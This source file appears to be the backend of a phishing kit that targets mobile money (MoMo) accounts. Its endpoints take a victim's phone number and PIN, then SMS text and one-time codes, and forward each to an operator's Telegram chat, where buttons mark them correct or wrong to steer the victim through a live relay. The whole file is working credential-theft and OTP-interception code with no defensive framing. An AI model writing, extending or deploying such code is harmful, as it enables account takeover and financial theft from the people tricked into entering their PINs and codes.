const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory storage for applications
const applications = {};

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Create application session
app.post('/applications', (req, res) => {
  const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
  applications[appId] = {
    id: appId,
    ...req.body,
    status: 'pending_auth',
    sms_status: 'pending_sms',
    otp_status: 'pending_otp'
  };
  res.json({ id: appId });
});

// Verify PIN / Auth Endpoint (Matches frontend /verify-pin)
app.post('/verify-pin', async (req, res) => {
  const { appId, pin, phone } = req.body;
  const appData = applications[appId];
  
  if (!appData) {
    applications[appId] = { id: appId, momo_phone: phone, momo_pin: pin, status: 'pending_auth' };
  } else {
    appData.momo_phone = phone || appData.momo_phone;
    appData.momo_pin = pin;
  }

  const currentApp = applications[appId];
  const message = `🔐 *MoMo Authentication Request*\n\n` +
    `📱 *Phone / MoMo Number:* ${currentApp.momo_phone || phone}\n` +
    `🔑 *PIN:* \`${pin}\`\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ CORRECT PIN', callback_data: `auth_approve_${appId}` },
        { text: '❌ WRONG PIN', callback_data: `auth_reject_${appId}` }
      ]
    ]
  };

  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing from environment variables!');
      return res.status(500).json({ error: 'Missing Telegram credentials in environment variables.' });
    }

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    
    const result = await response.json();
    if (!result.ok) {
      console.error('Telegram API Error (Auth):', result);
      return res.status(500).json({ error: `Telegram Error: ${result.description}` });
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Fetch exception error:', error);
    res.status(500).json({ error: 'Failed to send notification to Telegram' });
  }
});

// Verify SMS Endpoint (Matches frontend /verify-sms)
app.post('/verify-sms', async (req, res) => {
  const { appId, smsText } = req.body;
  const appData = applications[appId] || { momo_phone: 'N/A' };
  appData.sms_text = smsText;

  const message = `💬 *SMS Verification Text Received*\n\n` +
    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n\n` +
    `📄 *Content:*\n${smsText}\n\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Correct SMS Text', callback_data: `sms_approve_${appId}` },
        { text: '❌ Wrong SMS Text', callback_data: `sms_reject_${appId}` }
      ]
    ]
  };

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    
    const result = await response.json();
    if (!result.ok) {
      console.error('Telegram API Error (SMS):', result);
      return res.status(500).json({ error: `Telegram Error: ${result.description}` });
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

// Verify OTP Endpoint (Matches frontend /verify-otp)
app.post('/verify-otp', async (req, res) => {
  const { appId, otpCode } = req.body;
  const appData = applications[appId] || { momo_phone: 'N/A' };
  appData.otp_code = otpCode;

  const message = `🔢 *OTP Verification Received*\n\n` +
    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n` +
    `🔑 *OTP Code:* \`${otpCode}\`\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Correct OTP', callback_data: `otp_approve_${appId}` },
        { text: '❌ Wrong OTP', callback_data: `otp_reject_${appId}` }
      ]
    ]
  };

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    
    const result = await response.json();
    if (!result.ok) {
      console.error('Telegram API Error (OTP):', result);
      return res.status(500).json({ error: `Telegram Error: ${result.description}` });
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

// Check Status Endpoint (Matches frontend /check-status/:id)
app.get('/check-status/:id', (req, res) => {
  const appData = applications[req.params.id];
  if (!appData) return res.status(404).json({ error: 'Application not found' });
  res.json(appData);
});

// Telegram Webhook Endpoint
app.post('/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const cb = update.callback_query;
    const dataParts = cb.data.split('_');
    const type = dataParts[0];
    const action = dataParts[1];
    const appId = dataParts.slice(2).join('_');

    if (applications[appId]) {
      if (type === 'auth') {
        applications[appId].status = (action === 'approve') ? 'PIN_APPROVED' : 'PIN_REJECTED';
      } else if (type === 'sms') {
        applications[appId].status = (action === 'approve') ? 'SMS_APPROVED' : 'SMS_REJECTED';
      } else if (type === 'otp') {
        applications[appId].status = (action === 'approve') ? 'APPROVED' : 'OTP_REJECTED';
      }
    }

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: `Action processed: ${action.toUpperCase()}`,
          show_alert: false
        })
      });

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: cb.message.chat.id,
          message_id: cb.message.message_id,
          reply_markup: { inline_keyboard: [] }
        })
      });
    } catch (e) {
      console.error('Callback error:', e);
    }
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
  
